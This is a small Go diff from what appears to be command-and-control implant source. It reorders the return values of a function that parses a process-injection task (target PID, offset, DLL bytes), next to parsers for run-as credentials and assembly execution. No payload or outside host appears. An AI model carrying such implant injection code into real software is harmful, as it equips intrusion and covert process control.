@@ -139,13 +139,13 @@ func parseRunAs(b []byte) ([]byte, []byte, []byte, []byte, error) {
 	return domain, username, password, cmd, err
 }
 
-func parseInject(b []byte) (uint32, []byte, uint32, error) {
+func parseInject(b []byte) (uint32, uint32, []byte, error) {
 	buf := bytes.NewBuffer(b)
 	pid := packet.ReadInt(buf)
 	// if there are prepends in payload, there will be an offset to indicate it
 	offset := packet.ReadInt(buf)
 	dll := buf.Bytes()
-	return pid, dll, offset, nil
+	return pid, offset, dll, nil
 }
 
 func parseExecAsm(b []byte) (uint16, uint16, uint32, []byte, []byte, []byte, error) {
